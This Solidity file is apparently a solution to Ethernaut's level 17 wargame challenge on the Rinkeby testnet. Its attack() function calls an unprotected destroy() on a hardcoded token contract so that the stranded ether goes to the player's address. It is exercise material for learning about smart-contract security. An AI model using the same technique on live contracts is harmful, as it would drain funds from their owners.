//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

//SimpleTokenContract has a self destruct function which can be used to recover the funds lost.
//Address of SimpleToken Contract obtained from rinkeby etherscan.

interface ISimpleToken {
    function transfer(address _to, uint256 _amount) external;

    function destroy(address payable _to) external;
}

contract EthernautLevel17 {
    address simpleTokenContractAddress =
        0xBee0Baa07817f0Fa8BAfe9a02bFD3f8FEb447AD8;
    address player = 0xC7005fe8AF6ca11FcC0092D3C4C5C3D883eCE16c;

    function attack() external {
        ISimpleToken(simpleTokenContractAddress).destroy(payable(player));
    }
}
